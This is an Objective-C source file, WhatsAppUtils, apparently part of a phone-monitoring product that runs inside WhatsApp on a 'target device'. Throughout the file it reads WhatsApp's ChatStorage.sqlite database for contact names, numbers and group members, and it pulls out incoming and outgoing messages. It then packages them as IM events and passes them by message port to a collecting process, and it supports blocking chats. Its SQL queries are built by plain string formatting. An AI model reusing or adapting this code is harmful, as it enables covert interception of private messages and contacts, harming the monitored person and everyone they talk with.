/**
 - Project name :  MSFSP
 - Class name   :  WhatsAppUtils
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  28/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "WhatsAppUtils.h"
#import "FMDatabase.h"
#import "DefStd.h"
#import "DebugStatus.h"
#import "DateTimeFormat.h"
#import "BlockEvent.h"
#import "FxIMEvent.h"
#import "MessagePortIPCSender.h"
#import "DefStd.h"
#import "FxRecipient.h"
#import "RestrictionHandler.h"

// WhatsApp class
#import "XMPPMessageStanza.h"
#import "ChatManager.h"
#import "WAMessage.h"

//#import "MessagePortIPCSender.h"
//#import "FxIMEvent.h"
//#import "FxRecipient.h"
//#import "ABContactsManager.h"


@interface WhatsAppUtils (private)
+ (BOOL) isGroupConversation: (WAMessage *) aMessage;

- (NSString *)	searchWhatsAppPath;
- (NSUInteger)	groupNumberFromMsgID: (NSString *) aMessageID;				// used for outgoing
- (NSUInteger)	groupNumberFromFromJID: (NSString *) aFromJID;				// used for incoming
- (BOOL)		isGroupOutgoingConversation: (NSString *) aMessageID;
- (BOOL)		isGroupIncomingConversation: (NSString *) aFromJID ;
@end


@implementation WhatsAppUtils


@synthesize mAccountInfo;
@synthesize mParticipantArray;
@synthesize mRecipientArray;
@synthesize mSenderContactName;



// For outgoing
static NSString* const kSelectWhatsAppGroupInfoForOutgoing   = @"Select ZGROUPINFO from ZWACHATSESSION where Z_PK in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@')";
static NSString* const kSelectWhatsAppSingleChatForOutgoing  = @"Select ZPARTNERNAME,ZCONTACTJID from ZWACHATSESSION where Z_PK in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@')";
static NSString* const kSelectWhatsAppGroupChatForOutgoing   = @"Select ZCONTACTNAME,ZMEMBERJID from ZWAGROUPMEMBER where ZCHATSESSION in (SELECT ZCHATSESSION from ZWAMESSAGE where ZSTANZAID='%@')";


// For incoming
static NSString* const kSelectWhatsAppGroupInfoFromJID			= @"Select ZGROUPINFO from ZWACHATSESSION where ZCONTACTJID='%@'";
static NSString* const kSelectWhatsAppSingleChatForIncoming		= @"Select ZPARTNERNAME,ZCONTACTJID from ZWACHATSESSION where ZCONTACTJID='%@'";
static NSString* const kSelectWhatsAppGroupChatForIncoming		= @"Select ZCONTACTNAME,ZMEMBERJID from ZWAGROUPMEMBER where ZCHATSESSION in (SELECT Z_PK from ZWACHATSESSION where ZCONTACTJID='%@')";



/**
 - Method name:				init
 - Purpose:					This method is used to initalize WhatsAppUtils
 - Argument list and description: No Argument
 - Return description:		No return type
 */
- (id) init {
	if ((self = [super init])) {
		NSString *whatsAppApth= [self searchWhatsAppPath];
		if(whatsAppApth) {
			mWhatsAppDB = [FMDatabase databaseWithPath:whatsAppApth];
			[mWhatsAppDB retain];
			[mWhatsAppDB open];
		}
		else {
			DLog (@"WhatsApp DB Error");
		}
	}
	return (self);
}


#pragma mark -
#pragma mark Class methods

+ (BlockEvent *) createBlockEventForWhatsAppWithParticipant: (NSArray *) aParticipantArray 
											  withDirection: (NSInteger) aDirection {
	BlockEvent *whatsAppEvent = [[BlockEvent alloc] initWithEventType:kIMEvent
												  eventDirection:aDirection 
											eventTelephoneNumber:nil
													eventContact:aParticipantArray	
											   eventParticipants:aParticipantArray // This is used in RestrictionUtils
													   eventDate:[RestrictionHandler blockEventDate] 
													   eventData:nil];
	return [whatsAppEvent autorelease];
}

+ (NSArray *) createFxRecipientArray: (NSArray *) aParticipantArray {
	NSMutableArray *participants = [NSMutableArray array];
	for (NSDictionary *partInfo in aParticipantArray) {
		FxRecipient *participant = [[FxRecipient alloc] init];
		[participant setRecipNumAddr:[partInfo objectForKey:kWhatsAppContactNumber]];
		[participant setRecipContactName:[partInfo objectForKey:kWhatsAppContactName]];
		[participants addObject:participant];
		[participant release];
	}
	return [NSArray arrayWithArray:participants];
}

/**
 - Method name:		formatWhatsAppID:
 - Purpose:			This method is used to format WhatsApp Id
 - Argument list and description:	wID (NSString)
 - Return type and description:		whatsAppID (NSString)  
 */
+ (NSString *) formatWhatsAppID: (NSString *) wID {
	NSString *whatsAppID = @"";
	NSArray *numberArr = [wID componentsSeparatedByString:@"@"];
	if ([numberArr count]) {
		whatsAppID = [numberArr objectAtIndex:0];
	}
	return whatsAppID;
}

// obsoleted: previously this method is used in HOOK(XMPPConnection, processIncomingMessages$, void, id arg) 
//+ (NSString *) getSender: (id) aIncomingParts {
//	NSString *from = [NSString string];
//	/*
//	 * Note that even single chat has author !!!
//	 * Example of author and from for SINGLE chat
//	 *		author	= "66906469301@s.whatsapp.net";
//	 *		from	= "66906469301-1347510925@g.us";
//	 * Example of author and from for GROUP chat
//	 *		author = "66906469301@s.whatsapp.net";
//	 *		from	= "66906469301-1347525728@g.us";
//	 */
//
//	DLog (@"author %@", [[aIncomingParts attributes] objectForKey:@"author"]) 
//	DLog (@"from %@", [[aIncomingParts attributes] objectForKey:@"from"])
//	
//	if ([[aIncomingParts attributes] objectForKey:@"author"]) {			// Case 1: group chat
//		from = [[aIncomingParts attributes] objectForKey:@"author"];		
//		DLog(@"From (Author): %@", from);		
//	} else	{															// Case 2: signle chat
//		from =  [[aIncomingParts attributes] objectForKey:@"from"];
//		DLog(@"From (Single): %@", from);						
//	}		
//	from = [WhatsAppUtils formatWhatsAppID:from];	
//	return from;
//}


/**
 - Method name:					incomingMessageParts:
 - Purpose:						This method is used to  create Incoming incomingMessageParts
 - Argument list and description:	aArg (id)
 - Return type and description:		(id)  
 */
+ (id) incomingMessageParts: (id) aArg {
	id incomingParts = nil;
	if([aArg isKindOfClass:[NSArray class]]){
		for (id element in aArg) {
			DLog (@"aArg class %@", [element class])
			if ([element isMemberOfClass:objc_getClass("XMPPMessageStanza")]) {
				DLog(@"part: %@", element);
				DLog(@"text %@", [(XMPPMessageStanza *)element text]);
				DLog(@"fromJID %@", [element fromJID]);
				DLog(@"toJID %@", [element toJID]);
				DLog(@"uniqueIdentifier %@", [element uniqueIdentifier]);
				DLog(@"attributes %@", [element attributes]);	
				DLog(@"value %@", [element value]);	
				DLog(@"chatState %@, %d", [element chatStateStrings], [element chatState]);	
				DLog(@"chatState %@", [element stringsForTypes]);
				DLog(@"type %d", [element type]);
				NSDictionary *attributes = [element attributes];
				
				if ([attributes objectForKey:@"retry"]) {
					DLog (@"This is retry message (retry no %@)", [attributes objectForKey:@"retry"])					
				} else {
					incomingParts = element;
					break;
				}
				
//				if (![element offline]) {
//					incomingParts = element;
//					break;
//				}										
			}			
		}
	} else {
		DLog (@"element is NOT array")
	}
	return incomingParts;
}

/**
 - Method name:					getPhoneNumberWithCountryCode:
 - Purpose:						This method is used to get a telphone number with country code
 - Argument list and description:	No Argument
 - Return type and description:	phoneNumberWithCountryCode (NSString *)
 */
+ (NSString *) getPhoneNumberWithCountryCode {
	ChatManager *chatManager	= [objc_getClass("ChatManager") sharedManager];
	NSString *countryCode		= [chatManager countryCode];
	NSString *phoneNumber		= [chatManager phoneNumber];
	NSString *phoneNumberWithCountryCode = [NSString stringWithFormat:@"%@%@", countryCode, phoneNumber];	
	DLog (@"phoneNumberWithCountryCode %@", phoneNumberWithCountryCode)
	return phoneNumberWithCountryCode;
}

+ (BOOL) isGroupConversation: (WAMessage *) aMessage {
	BOOL isGroup = NO;
	if ([aMessage groupMember]) // && [aMessage participantJID])  // the case of creating new group, no participant id
		isGroup  = YES;	
	return isGroup;
}

+ (NSString *) getSenderOfIncomingMessage: (WAMessage *) aMessage {
	NSString *sender = @"";
	if ([WhatsAppUtils isGroupConversation:aMessage]) {
		sender = [aMessage participantJID];
	} else {
		sender = [aMessage fromJID];
	}
	DLog (@"> unformatted sender: %@", sender)
	sender = [self formatWhatsAppID:sender];
	DLog (@"> formatted sender: %@", sender)
	return sender;
}



#pragma mark -
#pragma mark Private methods

/**
 - Method name:					searchWhatsAppPath:
 - Purpose:						This method is used to search WahtsApp DB path
 - Argument list and description:	No Argument
 - Return type and description:	No Return type 
 */
- (NSString *) searchWhatsAppPath {
	NSString *whatsAppPath = nil;
	NSArray *paths = NSSearchPathForDirectoriesInDomains (NSDocumentDirectory, NSUserDomainMask, YES);
	if([paths count]) {
       NSString *docDirPath = [paths objectAtIndex:0];
       whatsAppPath = [NSString stringWithFormat:@"%@/ChatStorage.sqlite", docDirPath];
	   //DLog (@"WHATSAPP DB PATH:%@", whatsAppPath);
	}
	return (whatsAppPath);
}

/**
 - Method name:			groupNumber:
 - Purpose:				This method is used to identify chat group if gno = 0, no group chat
 - Argument list and description:	messageID (NSString)
 - Return type and description:		gno(NSUInteger)  
 */
- (NSUInteger) groupNumberFromMsgID: (NSString *) aMessageID {
	NSUInteger gno = 0;
	FMResultSet* resultSet = [mWhatsAppDB executeQuery:[NSString stringWithFormat:kSelectWhatsAppGroupInfoForOutgoing, aMessageID]];
	while ([resultSet next]) {
	    gno = [resultSet intForColumnIndex:0];
	}
	return gno;
}

/**
 - Method name:			groupNumber:
 - Purpose:				This method is used to identify chat group if gno = 0, no group chat
 - Argument list and description:	messageID (NSString)
 - Return type and description:		gno(NSUInteger)  
 */
- (NSUInteger) groupNumberFromFromJID: (NSString *) aFromJID {
	NSUInteger gno = 0;
	//DLog(@"sql for group selection: %@", kSelectWhatsAppGroupInfoFromJID )
	//DLog(@"JID to be selected %@", aFromJID)
	FMResultSet* resultSet = [mWhatsAppDB executeQuery:[NSString stringWithFormat:kSelectWhatsAppGroupInfoFromJID, aFromJID]];
	while ([resultSet next]) {
	    gno = [resultSet intForColumnIndex:0];
	}
	return gno;
}

// return true if it's a group conversation
- (BOOL) isGroupOutgoingConversation: (NSString *) aMessageID  {
	NSUInteger groupNumber = [self groupNumberFromMsgID:aMessageID];
	DLog (@"group number: %d", groupNumber)
	return (groupNumber != 0);
}

// return true if it's a group conversation
- (BOOL) isGroupIncomingConversation: (NSString *) aFromJID  {
	NSUInteger groupNumber = [self groupNumberFromFromJID:aFromJID];
	DLog (@"group number: %d", groupNumber)
	return (groupNumber != 0);
}


#pragma mark -
#pragma mark Public methods
#pragma mark Outgoing

// This method is required to be called before getting mParticipantArray or mRecipientArray 
- (NSArray *) getRecipientFromDBForOutgoingEvent: (NSString *) aMessageID {
	
	NSMutableArray* recipients = [[NSMutableArray alloc] init];		// not include me (Array of NSString of contact number)
	NSString *sql = nil;
	
	// -- find sql statement
	if ([self isGroupOutgoingConversation:aMessageID]) {
		DLog (@"group")
		sql = [NSString stringWithFormat:kSelectWhatsAppGroupChatForOutgoing, aMessageID];	// queries participants of conversion INCLUDING me
	} else {
		DLog (@"single")
		sql = [NSString stringWithFormat:kSelectWhatsAppSingleChatForOutgoing, aMessageID];
	}
	//DLog (@"sql: %@", sql)
	
	// -- get the phone number with country code of target device
	NSString *phoneNumberWithCountryCode = [WhatsAppUtils getPhoneNumberWithCountryCode];
	
	// -- query participant and recipient
	FMResultSet* resultSet = [mWhatsAppDB executeQuery:sql];
	while ([resultSet next]) {
		NSString *contactNumber = [WhatsAppUtils formatWhatsAppID:[resultSet stringForColumnIndex:1]];
		NSString *contactName = [resultSet stringForColumnIndex:0];		
		DLog (@"> contactNumber: %@", contactNumber)
		DLog (@"> contactName: %@", contactName)

		if (contactNumber) {
			NSMutableDictionary *dictionary = [[NSMutableDictionary alloc] init];
			[dictionary setValue:contactName
						  forKey:kWhatsAppContactName];				// contact name
			[dictionary setValue:contactNumber 
						  forKey:kWhatsAppContactNumber];			// contact number		
			
			if (![contactNumber isEqualToString:phoneNumberWithCountryCode]) {
				[recipients addObject:contactNumber];				// filter out the target device account		
			}
			[dictionary release];			
		}
	}
	[self setMRecipientArray:recipients];	
	DLog(@"Recipient Array:%@", [self mRecipientArray]);
	return [recipients autorelease];
}

// This method is required to be called before getting mParticipantArray or mRecipientArray 
- (void) retrieveParticipantFromDBForOutgoingEvent: (id) aOutGoingEvent {
	
	// -- find a message ID contained in the event
	NSString *messageID = [[aOutGoingEvent attributes] objectForKey:@"id"];
	DLog (@"message id to query: %@", messageID)
	
	// ** participant is all excluding the sender of the message since it is used for create an IM event
	// array of dictionary
	NSMutableArray* participants = [[NSMutableArray alloc] init];	// include me

	// ** recipient is all excluding the target device since it is used for blocking 
	// array of contact number
	NSMutableArray* recipients = [[NSMutableArray alloc] init];		// not include me
	
	NSString *sql = nil;
	
	// -- find sql statement
	if ([self isGroupOutgoingConversation:messageID]) {
		DLog (@"group")
		sql = [NSString stringWithFormat:kSelectWhatsAppGroupChatForOutgoing, messageID];	// queries participants of conversion INCLUDING me
	} else {
		DLog (@"single")
		//[participants addObject:mAccountInfo];											// add itself
		sql = [NSString stringWithFormat:kSelectWhatsAppSingleChatForOutgoing, messageID];
	}
	//DLog (@"sql: %@", sql)
	
	// -- get the phone number with country code of target device
	NSString *phoneNumberWithCountryCode = [WhatsAppUtils getPhoneNumberWithCountryCode];
	
	// -- query participant and recipient
	FMResultSet* resultSet = [mWhatsAppDB executeQuery:sql];
	while ([resultSet next]) {
		NSString *contactNumber = [WhatsAppUtils formatWhatsAppID:[resultSet stringForColumnIndex:1]];
		//NSString *contactName	= [resultSet stringForColumnIndex:0];		
		DLog (@">> contactNumber: %@", contactNumber)
		//DLog (@">> contactName: %@", contactName)
		
		if (contactNumber) {
			NSMutableDictionary *dictionary = [[NSMutableDictionary alloc] init];
			[dictionary setValue:[resultSet stringForColumnIndex:0] 
						  forKey:kWhatsAppContactName];				// contact name
			[dictionary setValue:contactNumber 
						  forKey:kWhatsAppContactNumber];			// contact number												
					
			if (![contactNumber isEqualToString:phoneNumberWithCountryCode]) {
			//if (![contactNumber isEqualToString:[mAccountInfo objectForKey:kWhatsAppContactNumber]]) {
				[participants addObject:dictionary];				// -- add participant (All excluding the sender)
				[recipients addObject:contactNumber];				// -- add recipient (All excluding the target)
		
			}
	
			[dictionary release];			
		}
	}
	
	[self setMParticipantArray:participants];
	[self setMRecipientArray:recipients];
	[participants release];
	participants = nil;
	[recipients release];
	recipients = nil;
	
	DLog(@"Participants Array:%@", [self mParticipantArray]);
	DLog(@"Recipient Array:%@", [self mRecipientArray]);
}


#pragma mark Incoming

- (NSArray *) getParticipantForIncomingEvent: (id) aOutGoingEvent 
							   excludeSender: (NSString *) sender {
	// -- find a message ID contained in the event
	NSString *fromJID = [aOutGoingEvent fromJID];
	DLog (@"fromJID to query: %@", fromJID)
	
	// ** participant is all excluding the sender of the message since it is used for create an IM event
	NSMutableArray* participants = [[NSMutableArray alloc] init];							// include me							
	NSString *sql = nil;
	
	// -- find sql statement
	if ([self isGroupIncomingConversation:fromJID]) {
		DLog (@"group")
		sql = [NSString stringWithFormat:kSelectWhatsAppGroupChatForIncoming, fromJID];		// INCLUDING me
	}
	else {
		DLog (@"single")
		[participants addObject:mAccountInfo];												// add itself
		sql = [NSString stringWithFormat:kSelectWhatsAppSingleChatForIncoming, fromJID];
	}
	//DLog (@"sql: %@", sql)
	
	FMResultSet* resultSet = [mWhatsAppDB executeQuery:sql];	
	while ([resultSet next]) {
		NSString *contactNumber = [WhatsAppUtils formatWhatsAppID:[resultSet stringForColumnIndex:1]];
		NSString *contactName	= [resultSet stringForColumnIndex:0];
		DLog (@">>> contactNumber: %@", contactNumber)
		DLog (@">>> contactName: %@", [resultSet stringForColumnIndex:0])
		if (contactNumber) {
			NSMutableDictionary *dictionary = [[NSMutableDictionary alloc] init];
			[dictionary setValue:contactName
						  forKey:kWhatsAppContactName];				// contact name
			[dictionary setValue:contactNumber 
						  forKey:kWhatsAppContactNumber];			// contact number
			if (![contactNumber isEqualToString:sender]) {				
				[participants addObject:dictionary];				// -- add participant (All excluding the sender)								
			} else {
				[self setMSenderContactName:contactName];
			}
			[dictionary release];		
		}
	}	
	[self setMParticipantArray:participants];
	DLog(@"Participants Array:%@", [self mParticipantArray]);
	return [participants autorelease];
}

/**
 - Method name:			accountInfo:userName:
 - Purpose:				This method is used to create WhatsApp account info
 - Argument list and description: aUserID (NSString *),userName(NSString *)
 - Return type and description: No Return 
 */
- (NSDictionary *) accountInfo: (NSString *) aUserID
					  userName: (NSString *) aUserName {
	NSMutableDictionary *accountDict = [[NSMutableDictionary alloc] init];
	[accountDict setObject:aUserID forKey:kWhatsAppContactNumber];
	[accountDict setObject:aUserName forKey:kWhatsAppContactName];
	return [accountDict autorelease];
}

- (void) outgoingEventSendingThread: (id) aMessage {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	DLog (@"WhatsAPP threaing start...");
	@try {
		[self sendWhatsAppEventForMessage:aMessage															// message
								 senderID:[[self mAccountInfo] objectForKey:kWhatsAppContactNumber]			// number
							   senderName:[[self mAccountInfo] objectForKey:kWhatsAppContactName]			// name
							 participants:[WhatsAppUtils createFxRecipientArray:[self mParticipantArray]]	// participant
								direction:kEventDirectionOut];												// out direction
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	
	DLog (@"WhatsAPP threaing end..");
	[pool release];
}

- (void) sendWhatsAppEventForMessage: (NSString *) aMessage		
							senderID: (NSString *) aSender
						  senderName: (NSString *) aSenderName
						participants: (NSArray *) aParticipantArray 
						   direction: (FxEventDirection) aDirection {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>> !!!!! BLOCKED WhatsApp event sent ====");
	
	NSMutableData* data = [[NSMutableData alloc] init];
	FxIMEvent* whatsAppEvent = [[FxIMEvent alloc] init];
	[whatsAppEvent setMDirection:aDirection];
	[whatsAppEvent setMUserID:aSender];
	[whatsAppEvent setMParticipants:aParticipantArray];		// exclude sender
	[whatsAppEvent setMIMServiceID:kIMServiceIDWhatsApp];
	[whatsAppEvent setMMessage:aMessage];
	[whatsAppEvent setMUserDisplayName:aSenderName];
	[whatsAppEvent setMAttachments:nil];
	[whatsAppEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	DLog (@"date for WhatsApp %@", [DateTimeFormat phoenixDateTime])
	
	NSKeyedArchiver* archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	[archiver encodeObject:whatsAppEvent forKey:kiMessageArchived];
	[archiver finishEncoding];
	[whatsAppEvent release];
	[archiver release];
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kWhatsAppMessagePort];
	[messagePortSender writeDataToPort:data];
	[messagePortSender release];
	[data release];
}

/**
 - Method name: dealloc
 - Purpose:  This method is used to manage memory
 - Argument list and description: No Argument
 - Return type and description: No Return 
*/
- (void) dealloc {
	if(mWhatsAppDB) {
	  [mWhatsAppDB close];
	  [mWhatsAppDB release];	 
	   mWhatsAppDB = nil;
	}
	[self setMAccountInfo:nil];	
	[self setMParticipantArray:nil];
	[self setMRecipientArray:nil];
	[self setMSenderContactName:nil];
	
	[super dealloc];	
}
@end
